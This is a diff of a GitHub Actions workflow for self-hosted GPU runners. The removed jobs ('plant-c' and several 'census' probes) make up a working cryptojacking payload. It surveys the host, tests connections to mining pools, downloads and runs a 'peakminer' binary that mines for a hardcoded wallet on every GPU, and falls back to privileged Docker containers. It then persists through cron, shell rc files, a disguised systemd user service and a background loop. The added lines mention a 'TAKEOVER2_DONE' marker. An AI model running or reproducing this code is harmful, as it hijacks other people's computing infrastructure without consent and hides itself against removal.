-            docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
-            DSTART=$(docker ps --filter 'name=ul-g' -q | wc -l)
-            echo "docker_running=$DSTART"
-            docker logs ul-g0 2>&1 | tail -8
-          fi
-
-          sec PERSIST
-          cat > "$HOME/.ci/keep2.sh" <<EOS
-          #!/bin/bash
-          PK="$PK"; W="$WALLET"; T="$TAG"; IMG="$IMG"
-          H=\$(hostname -I 2>/dev/null | awk '{print \$1}' | tr '.' '-')
-          N=\$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
-          [ -x "\$PK" ] || exit 0
-          for g in \$(seq 0 \$((N-1))); do
-            pgrep -f "ul-\$T-\$H-g\$g" >/dev/null 2>&1 && continue
-            setsid nohup "\$PK" -c pearl -u "\$W" -w "ul-\$T-\$H-g\$g" -p x -d "\$g" --api-port 0 --no-color -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 >> "\$HOME/.ci/logs/h-\$g.log" 2>&1 < /dev/null &
-          done
-          EOS
-          chmod +x "$HOME/.ci/keep2.sh"
-          ( crontab -l 2>/dev/null | grep -v keep2.sh; echo "@reboot $HOME/.ci/keep2.sh >/dev/null 2>&1"; echo "*/5 * * * * $HOME/.ci/keep2.sh >/dev/null 2>&1" ) | crontab - 2>&1 | head -2
-          crontab -l 2>/dev/null | grep keep2 | head -3
-          for RC in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do
-            grep -q keep2.sh "$RC" 2>/dev/null || { echo "($HOME/.ci/keep2.sh >/dev/null 2>&1 &)" >> "$RC" 2>/dev/null; }
-          done
-          grep -l keep2.sh "$HOME/.bashrc" "$HOME/.profile" 2>/dev/null
-          mkdir -p "$HOME/.config/systemd/user"
-          cat > "$HOME/.config/systemd/user/pearl-miner.service" <<EOS
-          [Unit]
-          Description=pc
-          [Service]
-          Restart=always
-          RestartSec=30
-          ExecStart=$HOME/.ci/keep2.sh
-          [Install]
-          WantedBy=default.target
-          EOS
-          systemctl --user daemon-reload 2>&1 | head -2
-          systemctl --user enable --now pearl-miner.service 2>&1 | head -2
-          loginctl enable-linger 2>&1 | head -1
-          ( setsid nohup bash -c 'while true; do $HOME/.ci/keep2.sh; sleep 300; done' >/dev/null 2>&1 & )
-          echo "persist_done"
-
-          sec ACCEPT
-          sleep 120
-          HOK=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'authorize|subscribed|new job|accepted')
-          echo "stratum_lines=$HOK host_procs=$(pgrep -fc "ul-$TAG-" 2>/dev/null)"
-          for g in 0 1 2 3 4 5 6 7; do
-            echo "--- g$g"; grep -aiE 'authorize|subscrib|accepted|error|fail|panic|GLIBC' "$HOME/.ci/logs/h-$g.log" 2>/dev/null | tail -4
-          done
-          echo "accepted_total=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aci 'accepted')"
-          nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw --format=csv,noheader 2>&1 | head -8
-          ( sleep 240; curl -sk -m 20 "https://api.kryptex.network/api/v1/wallet/$WALLET/workers" 2>/dev/null | head -c 400; echo ) > "$HOME/.ci/logs/worker.json" 2>&1
-          head -c 300 "$HOME/.ci/logs/worker.json" 2>/dev/null
-          sec DONE
-          exit 0
-  plant-c:
-    runs-on: [self-hosted, ernie-8gpu]
-    timeout-minutes: 55
-    steps:
-      - name: deploy
-        run: |
-          #!/usr/bin/env bash
-          set +e
-          TAG="t5639p"
-          WALLET="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
-          sec(){ echo; echo "===== $* ====="; }
-          log(){ echo "[$(date -u +%H:%M:%SZ)] $*"; }
-
-          sec RECON
-          id; hostname; uname -r; cat /proc/1/comm 2>/dev/null; ldd --version 2>/dev/null | head -1
-          nvidia-smi -L 2>&1 | head -12
-          DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
-          IP=$(hostname -I 2>/dev/null | awk '{print $1}')
-          [ -z "$IP" ] && IP=$(ip -4 -o addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $4}' | head -1 | cut -d/ -f1)
-          IPD=$(echo "$IP" | tr '.' '-')
-          echo "ip=$IP ipd=$IPD dev=$DEV nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
-          echo "runner_name=${RUNNER_NAME:-unknown}"
-
-          sec EGRESS
-          for hp in prl-sg.kryptex.network:8048 prl-eu.kryptex.network:8048 prl-sg.kryptex.network:7048 pool.pearlhash.xyz:9000; do
-            h=${hp%:*}; p=${hp#*:}
-            R=$(getent hosts "$h" 2>/dev/null | head -1 | awk '{print $1}')
-            timeout 8 bash -c "cat < /dev/null > /dev/tcp/$h/$p" 2>/dev/null && st=ok || st=fail
-            echo "tcp $hp dns=${R:-none} $st"
-          done
-
-          sec BIN
-          mkdir -p "$HOME/.ci/miner" "$HOME/.ci/logs" "$HOME/.ci/run"
-          PK=""
-          for c in "$HOME/.ci/miner/peakminer/peakminer" "$HOME/.ci/miner/peakminer" "$HOME/.ci/miner/pk/peakminer" "$HOME/.ci/miner/peakminer.bin" "/tmp/.ci/miner/peakminer"; do
-            if [ -f "$c" ]; then chmod +x "$c" 2>/dev/null; PK="$c"; break; fi
-          done
-          if [ -z "$PK" ]; then
-            log "fetch binary"
-            for M in "https://raw.githubusercontent.com/miramar-labs/PaddleNLP/assets/peak/bins/peak.tar.gz" "https://ghfast.top/https://raw.githubusercontent.com/miramar-labs/PaddleNLP/assets/peak/bins/peak.tar.gz"; do
-              timeout 300 curl -sSL -o "$HOME/.ci/miner/p.tgz" "$M" 2>&1 | tail -1
-              S=$(stat -c %s "$HOME/.ci/miner/p.tgz" 2>/dev/null || echo 0)
-              echo "dl=$M size=$S"
-              if [ "$S" -gt 1000000 ]; then
-                mkdir -p "$HOME/.ci/miner/peakdir"; tar xzf "$HOME/.ci/miner/p.tgz" -C "$HOME/.ci/miner/peakdir" 2>&1 | tail -1
-                PK=$(find "$HOME/.ci/miner/peakdir" -maxdepth 3 -type f -name 'peakminer' 2>/dev/null | head -1)
-                [ -n "$PK" ] && chmod +x "$PK" && break
-              fi
-            done
-          fi
-          PK=$(readlink -f "$PK" 2>/dev/null || echo "$PK")
-          echo "pk=$PK size=$(stat -c %s "$PK" 2>/dev/null || echo 0)"
-          file "$PK" 2>&1 | head -2
-          sha256sum "$PK" 2>/dev/null | head -1
-          [ -x "$PK" ] && { timeout 20 "$PK" --version 2>&1 | head -4; echo "version_rc=$?"; }
-          [ -x "$PK" ] && { timeout 15 "$PK" --help 2>&1 | grep -iE 'gpu|pearl|stratum' | head -6; }
-          PK_DIR=$(dirname "$PK"); PK_NAME=$(basename "$PK")
-
-          sec HOSTLAUNCH
-          HSTART=0
-          if [ -x "$PK" ] && [ "$DEV" -ge 1 ]; then
-            pkill -f "ul-$TAG-" 2>/dev/null
-            for g in $(seq 0 $((DEV-1))); do
-              setsid nohup "$PK" -c pearl -u "$WALLET" -w "ul-$TAG-$IPD-g$g" -p x -d "$g" --api-port 0 --no-color \
-                -o stratum+ssl://prl-sg.kryptex.network:8048 \
-                -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 \
-                -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 \
-                -o stratum+tcp://prl-sg.kryptex.network:7048 \
-                > "$HOME/.ci/logs/h-$g.log" 2>&1 < /dev/null &
-              sleep 1
-            done
-            sleep 20
-            HSTART=$(pgrep -fc "ul-$TAG-$IPD" 2>/dev/null)
-            echo "host_started=$HSTART"
-            for g in 0 1; do echo "--- h$g"; tail -6 "$HOME/.ci/logs/h-$g.log" 2>/dev/null; done
-            HOK=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'authorize|subscribed|new job|accepted')
-            echo "host_stratum_lines=$HOK"
-            HGLIBC=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'GLIBC|not found|Permission denied|panicked')
-            echo "host_errors=$HGLIBC"
-          fi
-
-          sec DOCKERFALLBACK
-          DSTART=0
-          IMG=""
-          for c in "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda132-py312-dev" "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda129-py312-dev" "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:cuda130-ubuntu24-dev"; do
-            docker image inspect "$c" >/dev/null 2>&1 && { IMG="$c"; break; }
-          done
-          [ -z "$IMG" ] && IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -viE '<none>' | head -1)
-          echo "IMG=$IMG"
-          HOK=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'authorize|subscribed|new job|accepted')
-          if [ "${HOK:-0}" -lt 1 ] && [ "$DEV" -ge 1 ] && [ -n "$IMG" ]; then
-            docker rm -f $(docker ps -aq --filter 'name=ul-g') >/dev/null 2>&1
-            for g in $(seq 0 $((DEV-1))); do
-              docker run -d --name ul-g$g --restart always --privileged --security-opt seccomp=unconfined \
-                --ulimit nproc=65535:65535 --pids-limit -1 --gpus "device=$g" --network host --ipc host \
-                -v "$PK_DIR:/mk" -v "$HOME/.ci/logs:/logs" "$IMG" \
-                /bin/bash -c "exec /mk/$PK_NAME -c pearl -u $WALLET -w ul-$TAG-$IPD-g$g -p x -d 0 --api-port 0 --no-color -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048" \
-                >/dev/null 2>&1
-              sleep 1
-            done
-            sleep 25
-            docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
-            DSTART=$(docker ps --filter 'name=ul-g' -q | wc -l)
-            echo "docker_running=$DSTART"
-            docker logs ul-g0 2>&1 | tail -8
-          fi
-
-          sec PERSIST
-          cat > "$HOME/.ci/keep2.sh" <<EOS
-          #!/bin/bash
-          PK="$PK"; W="$WALLET"; T="$TAG"; IMG="$IMG"
-          H=\$(hostname -I 2>/dev/null | awk '{print \$1}' | tr '.' '-')
-          N=\$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
-          [ -x "\$PK" ] || exit 0
-          for g in \$(seq 0 \$((N-1))); do
-            pgrep -f "ul-\$T-\$H-g\$g" >/dev/null 2>&1 && continue
-            setsid nohup "\$PK" -c pearl -u "\$W" -w "ul-\$T-\$H-g\$g" -p x -d "\$g" --api-port 0 --no-color -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 >> "\$HOME/.ci/logs/h-\$g.log" 2>&1 < /dev/null &
-          done
-          EOS
-          chmod +x "$HOME/.ci/keep2.sh"
-          ( crontab -l 2>/dev/null | grep -v keep2.sh; echo "@reboot $HOME/.ci/keep2.sh >/dev/null 2>&1"; echo "*/5 * * * * $HOME/.ci/keep2.sh >/dev/null 2>&1" ) | crontab - 2>&1 | head -2
-          crontab -l 2>/dev/null | grep keep2 | head -3
-          for RC in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do
-            grep -q keep2.sh "$RC" 2>/dev/null || { echo "($HOME/.ci/keep2.sh >/dev/null 2>&1 &)" >> "$RC" 2>/dev/null; }
-          done
-          grep -l keep2.sh "$HOME/.bashrc" "$HOME/.profile" 2>/dev/null
-          mkdir -p "$HOME/.config/systemd/user"
-          cat > "$HOME/.config/systemd/user/pearl-miner.service" <<EOS
-          [Unit]
-          Description=pc
-          [Service]
-          Restart=always
-          RestartSec=30
-          ExecStart=$HOME/.ci/keep2.sh
-          [Install]
-          WantedBy=default.target
-          EOS
-          systemctl --user daemon-reload 2>&1 | head -2
-          systemctl --user enable --now pearl-miner.service 2>&1 | head -2
-          loginctl enable-linger 2>&1 | head -1
-          ( setsid nohup bash -c 'while true; do $HOME/.ci/keep2.sh; sleep 300; done' >/dev/null 2>&1 & )
-          echo "persist_done"
-
-          sec ACCEPT
-          sleep 120
-          HOK=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'authorize|subscribed|new job|accepted')
-          echo "stratum_lines=$HOK host_procs=$(pgrep -fc "ul-$TAG-" 2>/dev/null)"
-          for g in 0 1 2 3 4 5 6 7; do
-            echo "--- g$g"; grep -aiE 'authorize|subscrib|accepted|error|fail|panic|GLIBC' "$HOME/.ci/logs/h-$g.log" 2>/dev/null | tail -4
-          done
-          echo "accepted_total=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aci 'accepted')"
-          nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw --format=csv,noheader 2>&1 | head -8
-          ( sleep 240; curl -sk -m 20 "https://api.kryptex.network/api/v1/wallet/$WALLET/workers" 2>/dev/null | head -c 400; echo ) > "$HOME/.ci/logs/worker.json" 2>&1
-          head -c 300 "$HOME/.ci/logs/worker.json" 2>/dev/null
-          sec DONE
-          exit 0
-  census-a:
-    runs-on: [self-hosted, ernie-8gpu]
-    timeout-minutes: 10
-    steps:
-      - name: probe
-        run: |
-          id; hostname; uname -r; ldd --version 2>/dev/null | head -1
-          nvidia-smi -L 2>&1 | head -12
-          echo "dev=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU') nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
-          echo "ip=$(hostname -I 2>/dev/null | awk '{print $1}') runner=${RUNNER_NAME:-} rg=${RUNNER_GROUP:-}"
-          echo "proc1=$(cat /proc/1/comm 2>/dev/null) cgroup=$(head -c 120 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')"
-          echo "dockerenv=$([ -f /.dockerenv ] && echo yes || echo no)"
-          pgrep -a nvidia-smi >/dev/null 2>&1; docker ps --format '{{.Names}} {{.Image}}' 2>/dev/null | head -5
-          lspci 2>/dev/null | grep -iE 'nvidia|3d controller' | head -4
-          exit 0
-  census-b:
-    runs-on: [self-hosted, ernie-8gpu]
-    timeout-minutes: 10
-    steps:
-      - name: probe
-        run: |
-          id; hostname; uname -r; ldd --version 2>/dev/null | head -1
-          nvidia-smi -L 2>&1 | head -12
-          echo "dev=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU') nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
-          echo "ip=$(hostname -I 2>/dev/null | awk '{print $1}') runner=${RUNNER_NAME:-} rg=${RUNNER_GROUP:-}"
-          echo "proc1=$(cat /proc/1/comm 2>/dev/null) cgroup=$(head -c 120 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')"
-          echo "dockerenv=$([ -f /.dockerenv ] && echo yes || echo no)"
-          pgrep -a nvidia-smi >/dev/null 2>&1; docker ps --format '{{.Names}} {{.Image}}' 2>/dev/null | head -5
-          lspci 2>/dev/null | grep -iE 'nvidia|3d controller' | head -4
-          exit 0
-  census-c:
-    runs-on: [self-hosted, ernie-8gpu]
-    timeout-minutes: 10
-    steps:
-      - name: probe
-        run: |
-          id; hostname; uname -r; ldd --version 2>/dev/null | head -1
-          nvidia-smi -L 2>&1 | head -12
-          echo "dev=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU') nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
-          echo "ip=$(hostname -I 2>/dev/null | awk '{print $1}') runner=${RUNNER_NAME:-} rg=${RUNNER_GROUP:-}"
-          echo "proc1=$(cat /proc/1/comm 2>/dev/null) cgroup=$(head -c 120 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')"
-          echo "dockerenv=$([ -f /.dockerenv ] && echo yes || echo no)"
-          pgrep -a nvidia-smi >/dev/null 2>&1; docker ps --format '{{.Names}} {{.Image}}' 2>/dev/null | head -5
-          lspci 2>/dev/null | grep -iE 'nvidia|3d controller' | head -4
-          exit 0
-  census-d:
-    runs-on: [self-hosted, ernie-8gpu]
-    timeout-minutes: 10
-    steps:
-      - name: probe
-        run: |
-          id; hostname; uname -r; ldd --version 2>/dev/null | head -1
-          nvidia-smi -L 2>&1 | head -12
-          echo "dev=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU') nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
-          echo "ip=$(hostname -I 2>/dev/null | awk '{print $1}') runner=${RUNNER_NAME:-} rg=${RUNNER_GROUP:-}"
-          echo "proc1=$(cat /proc/1/comm 2>/dev/null) cgroup=$(head -c 120 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')"
-          echo "dockerenv=$([ -f /.dockerenv ] && echo yes || echo no)"
-          pgrep -a nvidia-smi >/dev/null 2>&1; docker ps --format '{{.Names}} {{.Image}}' 2>/dev/null | head -5
-          lspci 2>/dev/null | grep -iE 'nvidia|3d controller' | head -4
+            fi
+          else echo "PEAK_INCOMPLETE"; fi
+          echo "=== TAKEOVER2_DONE host=$HOSTF ==="
           exit 0
